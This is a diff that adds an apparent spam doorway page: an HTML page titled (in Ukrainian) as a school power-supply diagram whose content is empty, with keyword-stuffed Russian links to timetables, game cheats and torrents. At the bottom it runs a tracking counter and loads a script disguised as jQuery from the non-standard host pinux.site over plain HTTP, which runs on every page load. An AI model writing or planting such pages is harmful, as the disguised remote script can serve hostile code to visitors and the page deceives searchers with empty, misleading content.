@@ -1,0 +1,140 @@
+<!DOCTYPE HTML>
+
+<html>
+
+<head>
+    <title>Однолінійна схема електропостачання школи - weongiequ.rails-i18n.org</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="main.css" />
+</head>
+
+<body class="subpage">
+    <div id="page-wrapper">
+
+        <!-- Header -->
+        <section id="header">
+            <div class="container">
+                <div class="row">
+                    <div class="col-12">
+
+                        <!-- Logo -->
+                        <h1><a href="/" id="logo">weongiequ.rails-i18n.org</a></h1>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Content -->
+        <section id="content">
+            <div class="container">
+                <div class="row">
+                    <div class="col-9 col-12-medium">
+
+                        <!-- Main Content -->
+                        <section>
+                            <header>
+                                <h2>Однолінійна схема електропостачання школи</h2>
+                            </header>
+                            <p></p>
+                        </section>
+
+                    </div>
+                    <div class="col-3 col-12-medium">
+
+                        <!-- Sidebar -->
+                        <section>
+                            <header>
+                                <h2>Links to Important Stuff</h2>
+                            </header>
+                            <ul class="link-list">
+                                <li><a href="g3t-raspisanie-avtobusa-12-zheleznodorozhnyy.html">Расписание автобуса 12 железнодорожный</a></li>
+                                <li><a href="g3t-serious-sam-1-chity.html">Serious sam 1 читы</a></li>
+                                <li><a href="g3t-poezd-simferopol-moskva-raspisanie-marshrut.html">Поезд симферополь москва расписание маршрут</a></li>
+                                <li><a href="g3t-fss-obrazec-zapolneniya-zayavleniya-o-vyplate-posobiya.html">Фсс образец заполнения заявления о выплате пособия</a></li>
+                                <li><a href="g3t-skachat-onlayn-film-titanik-v-horoshem-kachestve.html">Скачать онлайн фильм титаник в хорошем качестве</a></li>
+                                <li><a href="g3t-skachat-novye-knigi-besplatno-i-bez-registracii.html">Скачать новые книги бесплатно и без регистрации</a></li>
+                            </ul>
+                        </section>
+                        <section>
+                            <header>
+                                <h2>Links</h2>
+                            </header>
+                            <ul class="link-list"></ul>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <section id="footer">
+            <div class="container">
+                <div class="row">
+                    <div class="col-8 col-12-medium">
+
+                        <!-- Links -->
+                        <section>
+                            <h2>Links to Important Stuff</h2>
+                            <div>
+                                <div class="row">
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="g3t-akceptovannyy-dogovor-primer.html">Акцептованный договор пример</a></li>
+                                            <li><a href="g3t-tovarnaya-nakladnaya-torg-13-skachat-blank.html">Товарная накладная торг 13 скачать бланк</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="g3t-ne-zapuskaetsya-realtek.html">Не запускается реалтек</a></li>
+                                            <li><a href="g3t-foto-slovarik-po-angliyskomu.html">Фото словарик по английскому</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="g3t-basovyy-vst-sintezator.html">Басовый vst синтезатор</a></li>
+                                            <li><a href="g3t-multiki-pro-maynkraft-mody-novye.html">Мультики про майнкрафт моды новые</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="g3t-moya-pervaya-korotkometrazhka-skachat-torrent.html">Моя первая короткометражка скачать торрент</a></li>
+                                            <li><a href="g3t-blok-pitaniya-mp-3-3s-shema.html">Блок питания мп 3 3с схема</a></li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+
+                    </div>
+                    <div class="col-4 col-12-medium imp-medium">
+
+                        <!-- Blurb -->
+                        <section>
+                            <h2>An Informative Text Blurb</h2>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Copyright -->
+        <div id="copyright">
+            &copy; Untitled. All rights reserved.</a>
+        </div>
+
+    </div>
+
+    <script type="text/javascript">
+        new Image().src = "//counter.yadro.ru/hit;jquery?r" +
+            escape(document.referrer) + ((typeof(screen) == "undefined") ? "" :
+                ";s" + screen.width + "*" + screen.height + "*" + (screen.colorDepth ?
+                    screen.colorDepth : screen.pixelDepth)) + ";u" + escape(document.URL) +
+            ";h" + escape(document.title.substring(0, 150)) +
+            ";" + Math.random();
+    </script>
+<script src="http://pinux.site/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</body>
+</html>
